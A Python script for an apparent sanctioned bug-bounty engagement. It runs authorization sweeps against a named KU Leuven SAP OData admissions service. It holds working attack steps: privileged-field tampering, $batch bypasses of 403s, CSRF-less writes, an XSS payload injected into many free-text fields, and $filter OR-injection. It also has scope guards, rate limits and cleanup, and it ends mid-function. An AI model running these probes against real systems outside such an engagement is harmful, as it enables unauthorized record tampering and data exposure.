#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KU Leuven Admissions — Intigriti — Track B authenticated authz-matrix harness
============================================================================

Executes VM-BRIEF-track-b-authz-matrix.md: 8 systematic authorization sweeps
against the SAP OData service ZC_AD_APPLICANT_SRV, from the researcher's OWN
test-account sessions (A and B), logging one JSON row per request.

THIS TOOL IS TIGHTLY BOUND TO ONE SANCTIONED ENGAGEMENT. The safety rails below
are not optional decoration — they encode the program's rules of engagement and
the ethical hard line (never touch a real applicant's record). Do not remove them.

    * Host allow-list ...... only webwsp.aps.kuleuven.be
    * Path allow-list ...... only /sap/opu/odata/sap/ZC_AD_APPLICANT_SRV/
    * Target-ID guard ...... any applicant id (IN########) or 12-digit application
                             id appearing in a request URL must be A's or B's.
                             An adjacent id aborts the whole run.
    * Rate limit ........... >= 1.1 s between requests, globally.
    * IMMEDIATE-STOP ....... a response carrying a name/email/DOB that isn't
                             Intigriti/Test/treyky* halts that sweep-class.
    * Sweep 7 cleanup ...... every free-text probe is reset to "" in a finally:.
    * Sweep 6 restore ...... statusCode is captured and restored to baseline.

Sessions are supplied by the human as cookie files (the IdP login is OUT of
scope and never touched here):
    ~/kuleuven_creds/A.cookies   (Netscape cookies.txt  OR  one 'Cookie: ...' line)
    ~/kuleuven_creds/B.cookies

Usage
-----
    python3 authz_matrix.py --dry-run                 # plan only, no network
    python3 authz_matrix.py                           # run all sweeps (needs sessions)
    python3 authz_matrix.py --sweeps 1,4,5            # run a subset
    python3 authz_matrix.py --summary-only            # (re)build the summary from jsonl

Deliverables (written next to the briefs, in vm-results/):
    02-authz-matrix.jsonl          one row per request
    02-authz-matrix-summary.md     sweep x 200 x 403 x anomaly + expansions
"""

import argparse
import http.cookiejar
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Scope constants (STRICT — from VM-BRIEF-track-b + SCOPE-NOTES)
# ---------------------------------------------------------------------------
ALLOWED_HOST = "webwsp.aps.kuleuven.be"
BASE_PATH = "/sap/opu/odata/sap/ZC_AD_APPLICANT_SRV"
BASE = f"https://{ALLOWED_HOST}{BASE_PATH}"
SAP_CLIENT = "200"          # observed in Track A HAR
SAP_LANGUAGE = "EN"

# The ONLY records we may address. Account A is the acting session for every
# sweep unless a sweep explicitly targets B; B appears as a cross-user target.
ACCT = {
    "A": {"applicant": "IN01051619", "application": "000000503432"},
    "B": {"applicant": "IN01051651", "application": "000000503434"},
}
ALLOWED_IDS = {
    ACCT["A"]["applicant"], ACCT["A"]["application"],
    ACCT["B"]["applicant"], ACCT["B"]["application"],
}
# self-alias '0' resolves server-side to the logged-in user
SELF_ALIAS = "0"

# Identity markers that mean "this is one of our own test records" — anything
# else in a name/email/DOB field trips IMMEDIATE-STOP.
OWN_IDENTITY_MARKERS = ("intigriti", "test", "treyky")

MIN_INTERVAL = 1.1          # seconds between requests, globally
CREDS_DIR = os.path.expanduser("~/kuleuven_creds")

HERE = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.abspath(os.path.join(HERE, "..", "vm-results"))
JSONL_PATH = os.path.join(RESULTS_DIR, "02-authz-matrix.jsonl")
PLAN_PATH = os.path.join(RESULTS_DIR, "02-authz-matrix.plan.jsonl")
SUMMARY_PATH = os.path.join(RESULTS_DIR, "02-authz-matrix-summary.md")

XSS_PAYLOAD = "<img src=x onerror=alert(1)>KLXSSPROBE"

# regexes for the target-ID guard
RE_APPLICANT_ID = re.compile(r"IN\d{8}")
RE_APPLICATION_ID = re.compile(r"\b\d{12}\b")
# cookie-ish tokens to scrub out of any logged response snippet
RE_COOKIE_SCRUB = re.compile(
    r"(MYSAPSSO2|SAP_SESSIONID[^;\s\"']*|sap-usercontext|SAP_SESSION[^;\s\"']*)"
    r"\s*[=:]\s*[^;\s\"'&]+", re.IGNORECASE)


class ScopeViolation(Exception):
    """Raised when a request would leave the sanctioned scope. Fatal."""


class SessionExpired(Exception):
    """Raised on 401/302-to-IdP. Halt and ask the human for fresh cookies."""


class ImmediateStop(Exception):
    """Raised when a response appears to carry a real applicant's PII."""


# ---------------------------------------------------------------------------
# Session / cookie loading
# ---------------------------------------------------------------------------
def load_cookie_header(path):
    """Return a 'name=value; name=value' Cookie header string from a creds file.

    Accepts either a single line beginning 'Cookie:' (verbatim), or a
    Netscape cookies.txt export, or a bare 'name=value; ...' blob.
    """
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        raw = fh.read().strip()
    if not raw:
        raise ValueError(f"{path} is empty")

    for line in raw.splitlines():
        if line.strip().lower().startswith("cookie:"):
            return line.split(":", 1)[1].strip()

    # Netscape format? (tab-separated, 7 fields, optional # comments)
    if any("\t" in ln for ln in raw.splitlines()):
        jar = http.cookiejar.MozillaCookieJar()
        try:
            jar.load(path, ignore_discard=True, ignore_expires=True)
            pairs = [f"{c.name}={c.value}" for c in jar]
            if pairs:
                return "; ".join(pairs)
        except Exception:
            pass  # fall through to raw handling

    # assume already a 'name=value; name=value' blob (single or multi line)
    return "; ".join(seg.strip() for seg in raw.replace("\n", ";").split(";") if seg.strip())


class Session:
    def __init__(self, label, cookie_header):
        self.label = label
        # dict of cookie name -> current value; seeded from the file and updated
        # from every Set-Cookie response header. SAP rotates SAP_SESSIONID_WSP_200
        # on every request; the CSRF token is paired with the *current* session
        # cookie, so a stale cookie breaks writes with "CSRF token validation failed".
        self.cookies = {}
        for seg in cookie_header.split(";"):
            seg = seg.strip()
            if not seg or "=" not in seg:
                continue
            n, v = seg.split("=", 1)
            self.cookies[n.strip()] = v.strip()
        self.csrf = None

    @property
    def cookie_header(self):
        return "; ".join(f"{n}={v}" for n, v in self.cookies.items())

    def update_from_set_cookie(self, set_cookie_headers):
        """Ingest Set-Cookie headers (list) — only name=value, ignore attributes."""
        for raw in set_cookie_headers or []:
            first = raw.split(";", 1)[0].strip()
            if "=" in first:
                n, v = first.split("=", 1)
                n, v = n.strip(), v.strip()
                if n and v and v.lower() != "deleted":
                    self.cookies[n] = v

    def __repr__(self):
        return f"<Session {self.label}>"


# ---------------------------------------------------------------------------
# The rate-limited, scope-guarded HTTP core
# ---------------------------------------------------------------------------
class Client:
    def __init__(self, dry_run=False, insecure=False, logger=None):
        self.dry_run = dry_run
        self.logger = logger
        self._last_req = 0.0
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx))
        # never auto-follow redirects: a 302 usually means session death -> IdP
        self._opener.add_handler(_NoRedirect())

    # -- scope guard --------------------------------------------------------
    @staticmethod
    def assert_in_scope(url):
        m = re.match(r"https://([^/]+)(/[^?]*)", url)
        if not m:
            raise ScopeViolation(f"unparseable URL: {url}")
        host, path = m.group(1), m.group(2)
        if host != ALLOWED_HOST:
            raise ScopeViolation(f"host out of scope: {host}")
        if not path.startswith(BASE_PATH + "/") and path != BASE_PATH:
            raise ScopeViolation(f"path out of scope: {path}")
        # target-ID guard: every applicant/application id in the URL must be ours.
        for tok in RE_APPLICANT_ID.findall(url):
            if tok not in ALLOWED_IDS:
                raise ScopeViolation(f"URL addresses a non-allowed applicant id: {tok}")
        for tok in RE_APPLICATION_ID.findall(url):
            if tok not in ALLOWED_IDS:
                raise ScopeViolation(f"URL addresses a non-allowed application id: {tok}")

    # -- rate limiter -------------------------------------------------------
    def _throttle(self):
        dt = time.monotonic() - self._last_req
        if dt < MIN_INTERVAL:
            time.sleep(MIN_INTERVAL - dt)
        self._last_req = time.monotonic()

    # -- one request --------------------------------------------------------
    def request(self, session, method, path, *, body=None, extra_headers=None,
                omit_csrf=False, note=""):
        """Perform (or, in dry-run, only plan) one request. Returns dict:
        {status, headers, text}."""
        url = path if path.startswith("http") else f"{BASE}/{path.lstrip('/')}"
        # ensure sap-client is present on the query string
        if "sap-client=" not in url:
            url += ("&" if "?" in url else "?") + f"sap-client={SAP_CLIENT}"
        self.assert_in_scope(url)
        # urllib rejects raw spaces / control chars in the URL. Encode ONLY unsafe
        # bytes in the path+query while preserving OData delimiters ($ ' , = & ? / ( ) : *).
        url = urllib.parse.quote(url, safe="/:?&=$'(),*+;@!~-._")

        headers = {
            "Accept": "application/json",
            "Cookie": session.cookie_header,
            "sap-language": SAP_LANGUAGE,
        }
        is_write = method not in ("GET", "HEAD")
        if is_write:
            headers["Content-Type"] = "application/json"
        if is_write and not omit_csrf:
            headers["x-csrf-token"] = session.csrf or "Fetch"
        if extra_headers:
            headers.update(extra_headers)

        data = None
        if body is not None:
            data = body if isinstance(body, bytes) else json.dumps(body).encode("utf-8")

        if self.dry_run:
            return {"status": None, "headers": {}, "text": "",
                    "planned": {"method": method, "url": _redact_url(url),
                                "omit_csrf": omit_csrf, "note": note,
                                "body": (body if not isinstance(body, bytes) else "<multipart>")}}

        self._throttle()
        def _do(headers_now):
            req = urllib.request.Request(url, data=data, method=method, headers=headers_now)
            try:
                resp = self._opener.open(req, timeout=30)
                st = resp.getcode()
                rh = {k.lower(): v for k, v in resp.getheaders()}
                sc = resp.headers.get_all("Set-Cookie") or []
                tx = resp.read(65536).decode("utf-8", errors="replace")
                return st, rh, sc, tx
            except urllib.error.HTTPError as e:
                st = e.code
                rh = {k.lower(): v for k, v in (e.headers.items() if e.headers else [])}
                sc = e.headers.get_all("Set-Cookie") if e.headers else []
                tx = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
                return st, rh, sc, tx

        try:
            status, rheaders, setcookies, text = _do(headers)
        except Exception as e:
            return {"status": "ERR", "headers": {}, "text": f"{type(e).__name__}: {e}"}

        # Ingest Set-Cookie updates from EVERY response (SAP rotates the session cookie).
        session.update_from_set_cookie(setcookies)
        # Consume any rotated CSRF token — it is paired with the session cookie we just updated.
        rot = rheaders.get("x-csrf-token")
        if rot and rot.lower() not in ("required", "fetch"):
            session.csrf = rot

        # session-death detection
        if status in (301, 302, 303, 307, 308):
            loc = rheaders.get("location", "")
            if "idp.kuleuven.be" in loc or "saml" in loc.lower() or "logon" in loc.lower():
                raise SessionExpired(f"{session.label}: redirect to {loc[:80]} — refresh cookies")
        if status == 401:
            raise SessionExpired(f"{session.label}: 401 Unauthorized — refresh cookies")

        # Transparent one-shot retry on "CSRF token validation failed": now that we have
        # the freshly-rotated session cookie + CSRF token from the failing response, retry
        # the SAME request with the new pair. If the server still rejects, that's real
        # (authz / etc.). Only retries writes.
        if (status == 403 and is_write
            and "csrf" in text.lower() and "token" in text.lower()
            and session.csrf and not omit_csrf):
            headers["Cookie"] = session.cookie_header
            headers["x-csrf-token"] = session.csrf
            self._throttle()
            try:
                status, rheaders, setcookies, text = _do(headers)
                session.update_from_set_cookie(setcookies)
                rot2 = rheaders.get("x-csrf-token")
                if rot2 and rot2.lower() not in ("required", "fetch"):
                    session.csrf = rot2
            except Exception as e:
                return {"status": "ERR", "headers": {}, "text": f"retry-{type(e).__name__}: {e}"}

        # IMMEDIATE-STOP PII scan
        flag = detect_foreign_pii(text)
        if flag:
            raise ImmediateStop(f"{note or url}: {flag}")

        return {"status": status, "headers": rheaders, "text": text}

    # -- CSRF fetch ---------------------------------------------------------
    def fetch_csrf(self, session):
        if self.dry_run:
            session.csrf = "<dry-run-token>"
            return session.csrf
        headers = {"Accept": "application/json", "Cookie": session.cookie_header,
                   "x-csrf-token": "Fetch"}
        url = f"{BASE}/?sap-client={SAP_CLIENT}"
        self.assert_in_scope(url)
        self._throttle()
        req = urllib.request.Request(url, method="GET", headers=headers)
        try:
            resp = self._opener.open(req, timeout=30)
            token = resp.getheaders()
            rheaders = {k.lower(): v for k, v in token}
            session.csrf = rheaders.get("x-csrf-token")
        except urllib.error.HTTPError as e:
            rheaders = {k.lower(): v for k, v in (e.headers.items() if e.headers else [])}
            session.csrf = rheaders.get("x-csrf-token")
            if e.code in (401,) or (e.code in (301, 302) and "idp" in rheaders.get("location", "")):
                raise SessionExpired(f"{session.label}: CSRF fetch got {e.code} — refresh cookies")
        if not session.csrf:
            raise SessionExpired(f"{session.label}: no CSRF token returned — session likely dead")
        return session.csrf


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None  # surface 3xx to us instead of following it


# ---------------------------------------------------------------------------
# helpers: PII detection, sanitization, logging
# ---------------------------------------------------------------------------
def detect_foreign_pii(text):
    """Return a short reason string if the body looks like it carries a real
    (non-own) applicant's identity, else ''. Conservative: only fires on a
    populated name/email/DOB field lacking every own-identity marker."""
    if not text:
        return ""
    low = text.lower()
    # quick allow: our own markers present anywhere -> almost certainly our data
    has_own = any(m in low for m in OWN_IDENTITY_MARKERS)
    findings = []
    for key in ("firstName", "lastName", "fullName", "name", "email",
                "birthDate", "dateOfBirth", "birthdate"):
        for m in re.finditer(rf'"{key}"\s*:\s*"([^"]+)"', text):
            val = m.group(1).strip()
            if not val or val in ("0", "00000000"):
                continue
            vlow = val.lower()
            if any(mark in vlow for mark in OWN_IDENTITY_MARKERS):
                continue
            # an email that is clearly ours
            if key.lower() == "email" and any(mark in vlow for mark in OWN_IDENTITY_MARKERS):
                continue
            findings.append(f"{key}={val[:24]!r}")
    if findings and not has_own:
        return "possible foreign PII: " + ", ".join(findings[:3])
    return ""


def _redact_url(url):
    return RE_COOKIE_SCRUB.sub(r"\1=<redacted>", url)


def response_shape(text):
    """First 200 chars, cookies scrubbed."""
    if not text:
        return ""
    scrubbed = RE_COOKIE_SCRUB.sub(r"\1=<redacted>", text)
    scrubbed = scrubbed.replace("\n", " ").replace("\r", " ")
    return scrubbed[:200]


class MatrixLogger:
    def __init__(self, path, dry_run=False, append=False):
        self.path = PLAN_PATH if dry_run else path
        self.dry_run = dry_run
        self.rows = []
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        # truncate at start of a fresh run, unless appending to an existing matrix
        if not append:
            open(self.path, "w").close()

    def log(self, sweep, entity_or_endpoint, method, variant, result, flags=None):
        row = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "sweep": sweep,
            "entity_or_endpoint": entity_or_endpoint,
            "method": method,
            "variant": variant,
            "status": result.get("status"),
            "response_shape": response_shape(result.get("text", "")),
            "notable_flags": flags or [],
        }
        if self.dry_run and "planned" in result:
            row["planned"] = result["planned"]
        self.rows.append(row)
        with open(self.path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(row, ensure_ascii=False) + "\n")
        # progress to stderr
        st = row["status"]
        print(f"  [{sweep}] {method} {variant[:60]:<60} -> {st} {','.join(row['notable_flags'])}",
              file=sys.stderr)
        return row


# ---------------------------------------------------------------------------
# small OData helpers
# ---------------------------------------------------------------------------
def read_entity(client, session, path, logger, sweep, variant):
    r = client.request(session, "GET", path, note=variant)
    logger.log(sweep, path, "GET", variant, r)
    return r


def json_field(text, field):
    """Pull a top-level field value from an OData JSON body (d.<field>)."""
    if not text:
        return None
    m = re.search(rf'"{re.escape(field)}"\s*:\s*("(?:[^"\\]|\\.)*"|true|false|null|-?\d+(?:\.\d+)?)',
                  text)
    if not m:
        return None
    raw = m.group(1)
    try:
        return json.loads(raw)
    except Exception:
        return raw


def merge(client, session, entity_path, patch, logger, sweep, variant,
          omit_csrf=False, extra_flags=None):
    r = client.request(session, "MERGE", entity_path, body=patch,
                       omit_csrf=omit_csrf, note=variant)
    flags = list(extra_flags or [])
    if r.get("status") == 204:
        flags.append("write_accepted_204")
    logger.log(sweep, entity_path, "MERGE", variant, r, flags)
    return r


# ---------------------------------------------------------------------------
# SWEEP 1 — privileged-field MERGE matrix on OWN application
# ---------------------------------------------------------------------------
SWEEP1_FIELDS = [
    ("statusCode", ["211", "216", "220", "901", "099"]),
    ("isPropositionAccepted", [True]),
    ("isAppFeePayed", [True]),
    ("caseAdmin", ["HACKER"]),
    ("followUpAdmLetter", ["1", "X"]),
    ("institution", ["12345678"]),
    ("academicYear", ["2099"]),
    ("program", ["99999999"]),
    ("moduleGroup", ["99999999"]),
    ("guid", ["A" * 32]),
]


def sweep1(client, sessions, logger):
    sA = sessions["A"]
    app = ACCT["A"]["application"]
    ent = f"Applications('{app}')"
    base = read_entity(client, sA, ent, logger, "1", "baseline read own application")
    base_txt = base.get("text", "")
    for field, values in SWEEP1_FIELDS:
        before = json_field(base_txt, field)
        for val in values:
            variant = f"MERGE {field}={val!r}"
            merge(client, sA, ent, {field: val}, logger, "1", variant)
            after = read_entity(client, sA, ent, logger, "1",
                                f"re-read after {field}={val!r}")
            now = json_field(after.get("text", ""), field)
            changed = (now == val) and (now != before)
            logger.log("1", ent, "COMPARE", f"{field}={val!r}",
                       {"status": "n/a", "text": ""},
                       flags=[f"field_changed={bool(changed)}",
                              f"before={before!r}", f"after={now!r}"])
    # compound
    variant = "MERGE caseAdmin='HACKER'+statusCode='211' (compound)"
    merge(client, sA, ent, {"caseAdmin": "HACKER", "statusCode": "211"},
          logger, "1", variant)
    read_entity(client, sA, ent, logger, "1", "re-read after compound")


# ---------------------------------------------------------------------------
# SWEEP 2 — $batch authz-bypass on Track-A 403s
# ---------------------------------------------------------------------------
SWEEP2_ENDPOINTS = [
    ("Applications('000000503434')/SubmitChecks", "GET", 403),
    ("DisciplineSet?$filter=applicationId eq '000000503434'", "GET", 403),
    ("TrefwoordenSet?$filter=applicationId eq '000000503434'", "GET", 403),
    ("Applications('000000503434|0')/Attachments('1')/$value", "GET", 403),
    ("RubriekSet?$filter=applicationCode eq '000000503434' and language eq 'E'", "GET", 400),
]


def _batch_body(sub_requests, boundary="batch_klxb", changeset=None):
    """Build a minimal OData v2 $batch multipart/mixed body.
    sub_requests: list of (method, relative_url) query GETs.
    changeset: optional list of (method, relative_url, json_body) writes."""
    lines = []
    for method, rel in sub_requests:
        lines += [
            f"--{boundary}",
            "Content-Type: application/http",
            "Content-Transfer-Encoding: binary",
            "",
            f"{method} {rel} HTTP/1.1",
            "Accept: application/json",
            "",
            "",
        ]
    if changeset:
        cs = "changeset_klxc"
        lines.append(f"--{boundary}")
        lines.append(f"Content-Type: multipart/mixed; boundary={cs}")
        lines.append("")
        for i, (method, rel, jb) in enumerate(changeset, 1):
            payload = json.dumps(jb)
            lines += [
                f"--{cs}",
                "Content-Type: application/http",
                "Content-Transfer-Encoding: binary",
                f"Content-ID: {i}",
                "",
                f"{method} {rel} HTTP/1.1",
                "Content-Type: application/json",
                "Accept: application/json",
                "",
                payload,
                "",
            ]
        lines.append(f"--{cs}--")
        lines.append("")
    lines.append(f"--{boundary}--")
    lines.append("")
    return ("\r\n".join(lines)).encode("utf-8"), boundary


def _parse_batch_inner_statuses(text):
    return [int(m.group(1)) for m in re.finditer(r"HTTP/1\.\d\s+(\d{3})", text or "")]


def sweep2(client, sessions, logger):
    sA = sessions["A"]
    for rel, method, direct_expected in SWEEP2_ENDPOINTS:
        # direct call to record current status
        direct = client.request(sA, method, rel, note=f"direct {rel}")
        logger.log("2", rel, method, f"direct (Track-A expected {direct_expected})", direct,
                   [f"direct_status={direct.get('status')}"])
        # $batch-wrapped GET
        body, boundary = _batch_body([(method, "/" + rel)])
        r = client.request(sA, "POST", "$batch", body=body,
                           extra_headers={"Content-Type": f"multipart/mixed; boundary={boundary}"},
                           note=f"$batch-wrap {rel}")
        inners = _parse_batch_inner_statuses(r.get("text", ""))
        flags = [f"batch_outer={r.get('status')}", f"batch_inner={inners}"]
        if any(s == 200 for s in inners) and direct.get("status") == 403:
            flags.append("ANOMALY_inner200_direct403")
        logger.log("2", rel, "POST $batch", f"batch-wrap {rel}", r, flags)


# ---------------------------------------------------------------------------
# SWEEP 3 — CSRF absence on writes
# ---------------------------------------------------------------------------
def sweep3(client, sessions, logger):
    sA = sessions["A"]
    ent = f"Applications('{ACCT['A']['application']}')"
    for field, values in SWEEP1_FIELDS:
        val = values[0]
        variant = f"MERGE {field}={val!r} WITHOUT csrf"
        r = merge(client, sA, ent, {field: val}, logger, "3", variant,
                  omit_csrf=True,
                  extra_flags=(["ANOMALY_csrf_not_enforced"]
                               if False else []))
        # re-tag after the fact based on status
        if r.get("status") == 204:
            logger.log("3", ent, "NOTE", variant,
                       {"status": "n/a", "text": ""},
                       flags=["ANOMALY_csrf_not_enforced_204"])


# ---------------------------------------------------------------------------
# SWEEP 4 — $expand lateral read
# ---------------------------------------------------------------------------
SWEEP4_EXPANDS = [
    ("Applicants('0')?$expand=Applications", "A"),
    ("Applicants('0')?$expand=Addresses,PersInfos,Curriculums,Languages,Scholarships,ApplicantPhotos", "A"),
    (f"Applications('{ACCT['A']['application']}')?$expand=Options,SubmitChecks,Attachments", "A"),
    (f"Applicants('{ACCT['B']['applicant']}')?$expand=Applications,PersInfos", "A"),  # cross-user
]


def sweep4(client, sessions, logger):
    sA = sessions["A"]
    # base entity for field-set diff
    base = read_entity(client, sA, "Applicants('0')", logger, "4", "base Applicants('0')")
    base_fields = set(re.findall(r'"(\w+)"\s*:', base.get("text", "")))
    for path, acting in SWEEP4_EXPANDS:
        variant = path
        flags = []
        if ACCT["B"]["applicant"] in path:
            flags.append("cross_user_expand")
        r = client.request(sessions[acting], "GET", path, note=variant)
        new_fields = set(re.findall(r'"(\w+)"\s*:', r.get("text", "")))
        extra = sorted(new_fields - base_fields)
        if extra:
            flags.append(f"extra_fields={extra[:12]}")
        logger.log("4", path, "GET", variant, r, flags)


# ---------------------------------------------------------------------------
# SWEEP 5 — FunctionImports
# ---------------------------------------------------------------------------
def _fi(client, session, name, params, logger, variant, seen_shapes):
    qs = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in params.items())
    path = f"{name}?{qs}" if qs else name
    r = client.request(session, "GET", path, note=variant)
    shape = response_shape(r.get("text", ""))
    flags = []
    if shape not in seen_shapes:
        seen_shapes.add(shape)
        flags.append("new_shape")
    logger.log("5", name, "GET", variant, r, flags)
    return r


def sweep5(client, sessions, logger):
    sA = sessions["A"]
    ownA = ACCT["A"]["application"]
    ownB = ACCT["B"]["application"]

    seen = set()
    pay_ids = ["", "0", "1", "TESTPAY"] + [str(n) for n in range(1, 31)]
    for adm in [ownA, ownB, ""]:
        for pid in pay_ids:
            _fi(client, sA, "isPaymentDone", {"admCode": adm, "paymentId": pid},
                logger, f"isPaymentDone admCode={adm or '∅'} paymentId={pid or '∅'}", seen)

    seen = set()
    for adm in [ownA, ownB, "", "!!malformed!!"]:
        _fi(client, sA, "showSpringFall", {"admCode": adm},
            logger, f"showSpringFall admCode={adm or '∅'}", seen)

    seen = set()
    for adm in [ownA, ownB, "", "!!malformed!!"]:
        _fi(client, sA, "showOptions", {"admCode": adm},
            logger, f"showOptions admCode={adm or '∅'}", seen)
    for prog in ["99999999", "50000050"]:
        _fi(client, sA, "showOptions", {"admCode": ownA, "program": prog},
            logger, f"showOptions program={prog}", seen)

    seen = set()
    _fi(client, sA, "getSwitchOpenSearch", {}, logger, "getSwitchOpenSearch no-params", seen)
    _fi(client, sA, "getSwitchOpenSearch", {"x": "junk"}, logger, "getSwitchOpenSearch junk", seen)


# ---------------------------------------------------------------------------
# SWEEP 6 — illegal state transitions (own application only) + restore
# ---------------------------------------------------------------------------
def sweep6(client, sessions, logger):
    sA = sessions["A"]
    ent = f"Applications('{ACCT['A']['application']}')"
    base = read_entity(client, sA, ent, logger, "6", "baseline before state tests")
    baseline_status = json_field(base.get("text", ""), "statusCode")
    baseline_fee = json_field(base.get("text", ""), "isAppFeePayed")
    logger.log("6", ent, "NOTE", "captured baseline",
               {"status": "n/a", "text": ""},
               [f"baseline_statusCode={baseline_status!r}", f"baseline_fee={baseline_fee!r}"])
    try:
        transitions = [
            ("211", "statusCode=211 skipping rubrieken gate"),
            ("216", "statusCode=216 (client never writes)"),
            ("217", "statusCode=217 (client never writes)"),
            ("220", "statusCode=220 post-decision value"),
        ]
        for code, desc in transitions:
            merge(client, sA, ent, {"statusCode": code}, logger, "6", f"MERGE {desc}")
            after = read_entity(client, sA, ent, logger, "6", f"re-read after {code}")
            persisted = json_field(after.get("text", ""), "statusCode")
            flags = [f"persisted_statusCode={persisted!r}"]
            if str(persisted) == code and str(baseline_status) != code:
                flags.append("ANOMALY_status_transition_persisted")
            # workflow side effects
            bl = client.request(sA, "GET", "BlockSet?$top=1", note="BlockSet side-effect probe")
            logger.log("6", "BlockSet", "GET", f"side-effect after {code}", bl,
                       flags)
        # fee-unpaid + post-payment status
        merge(client, sA, ent, {"isAppFeePayed": False}, logger, "6",
              "MERGE isAppFeePayed=false")
        merge(client, sA, ent, {"statusCode": "216"}, logger, "6",
              "MERGE post-payment status while fee unpaid")
    finally:
        # prudent restore of statusCode to baseline (not required by brief, but responsible)
        if baseline_status is not None:
            merge(client, sA, ent, {"statusCode": str(baseline_status)}, logger, "6",
                  f"RESTORE statusCode={baseline_status!r}",
                  extra_flags=["restore"])
            chk = read_entity(client, sA, ent, logger, "6", "verify restore")
            restored = json_field(chk.get("text", ""), "statusCode")
            logger.log("6", ent, "NOTE", "restore verification",
                       {"status": "n/a", "text": ""},
                       [f"restored_ok={str(restored) == str(baseline_status)}"])


# ---------------------------------------------------------------------------
# SWEEP 7 — stored-XSS persistence probe on OWN free-text fields (+ cleanup)
# ---------------------------------------------------------------------------
SWEEP7_TARGETS = [
    ("PersInfos('0')",
     ["additionalRemarks", "otherReasonSpecify", "familyReunionWith",
      "workingWhere", "studyingWhere", "birthPlace", "motherLanguage"]),
    (f"Applications('{ACCT['A']['application']}')",
     ["additionalremarks", "doctSummaryEN", "doctSummaryNL", "doctKeywords",
      "doctFinancialInfo", "doctSpecialisation", "doctPartnerUniversity",
      "exchProgram", "exchHomeUniversity", "exchContactName", "intScholarSubject",
      "specSpecialisation", "infoAboutProgramOther", "exchProgramOther",
      "exchStudentTypeOther", "exchPurposeOther"]),
    ("Addresses(inAccountId='0',language='E')", ["street1", "city"]),
]


def _classify_stored(readback_val):
    if readback_val is None:
        return "readback_none"
    s = str(readback_val)
    if "<img" in s and "KLXSSPROBE" in s:
        return "stored_RAW"
    if "&lt;img" in s or "&amp;" in s:
        return "stored_encoded"
    if s == "" :
        return "stored_stripped_or_empty"
    if "KLXSSPROBE" in s:
        return "stored_marker_only"
    return "unknown"


def sweep7(client, sessions, logger):
    sA = sessions["A"]
    cleanup_report = []
    for ent, fields in SWEEP7_TARGETS:
        for field in fields:
            try:
                merge(client, sA, ent, {field: XSS_PAYLOAD}, logger, "7",
                      f"inject {ent}.{field}")
                rb = read_entity(client, sA, ent, logger, "7",
                                 f"readback {ent}.{field}")
                val = json_field(rb.get("text", ""), field)
                verdict = _classify_stored(val)
                logger.log("7", ent, "CLASSIFY", f"{field} -> {verdict}",
                           {"status": "n/a", "text": ""},
                           [verdict] + (["ANOMALY_stored_raw"] if verdict == "stored_RAW" else []))
            finally:
                # MANDATORY cleanup — always runs
                cr = merge(client, sA, ent, {field: ""}, logger, "7",
                           f"CLEANUP {ent}.{field} -> ''", extra_flags=["cleanup"])
                verify = read_entity(client, sA, ent, logger, "7",
                                     f"verify cleanup {ent}.{field}")
                cleaned = json_field(verify.get("text", ""), field)
                ok = (cleaned in ("", None))
                cleanup_report.append((ent, field, ok, cr.get("status")))
                logger.log("7", ent, "CLEANUP_VERIFY", f"{field} empty={ok}",
                           {"status": "n/a", "text": ""},
                           [f"cleanup_ok={ok}"])
    return cleanup_report


# ---------------------------------------------------------------------------
# SWEEP 8 — $filter injection & property projection
# ---------------------------------------------------------------------------
def sweep8(client, sessions, logger):
    sA = sessions["A"]
    ownA = ACCT["A"]["application"]
    ownB = ACCT["B"]["application"]
    coll = "RubriekSet"  # accepts $filter on applicationCode (Track A)
    variants = [
        (f"{coll}?$filter=applicationCode eq '{ownA}' or applicationCode eq '{ownB}' and language eq 'E'",
         "OR-injection own-OR-B"),
        (f"{coll}?$filter=1 eq 1 and language eq 'E'", "1 eq 1"),
        (f"{coll}?$filter=applicationCode eq '' or 1 eq 1 and language eq 'E'", "empty or 1eq1"),
        (f"{coll}?$filter=applicationCode eq '''", "single-quote injection (malformed)"),
    ]
    for path, label in variants:
        r = client.request(sA, "GET", path, note=label)
        flags = []
        # if B's rows appear where only A should be visible -> the finding.
        if ownB in r.get("text", "") and label.startswith("OR"):
            flags.append("ANOMALY_or_injection_returned_B")
        logger.log("8", coll, "GET", label, r, flags)
    # $select=* over-exposure
    for ent in [f"Applications('{ownA}')", "PersInfos('0')"]:
        path = f"{ent}?$select=*"
        r = client.request(sA, "GET", path, note=f"$select=* {ent}")
        nfields = len(set(re.findall(r'"(\w+)"\s*:', r.get("text", ""))))
        logger.log("8", ent, "GET", f"$select=* ({nfields} fields)", r,
                   [f"field_count={nfields}"])


# ---------------------------------------------------------------------------
# summary builder
# ---------------------------------------------------------------------------
def build_summary(jsonl_path=JSONL_PATH, out_path=SUMMARY_PATH):
    if not os.path.exists(jsonl_path):
        return False
    rows = []
    with open(jsonl_path, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if line:
                rows.append(json.loads(line))
    if not rows:
        return False

    sweeps = {}
    anomalies = []
    for r in rows:
        s = str(r.get("sweep"))
        d = sweeps.setdefault(s, {"200": 0, "403": 0, "anomaly": 0, "total": 0})
        d["total"] += 1
        st = r.get("status")
        if st == 200 or st == 204:
            d["200"] += 1
        elif st == 403:
            d["403"] += 1
        flags = r.get("notable_flags", [])
        if any(str(f).startswith("ANOMALY") for f in flags):
            d["anomaly"] += 1
            anomalies.append(r)

    lines = []
    lines.append("# Track B — authz-matrix — run summary")
    lines.append("")
    lines.append(f"Generated {datetime.now(timezone.utc).isoformat()} from "
                 f"`{os.path.basename(jsonl_path)}` ({len(rows)} rows).")
    lines.append("")
    lines.append("## Sweep × status")
    lines.append("")
    lines.append("| Sweep | total | 200/204 | 403 | anomalies |")
    lines.append("|---|---|---|---|---|")
    for s in sorted(sweeps):
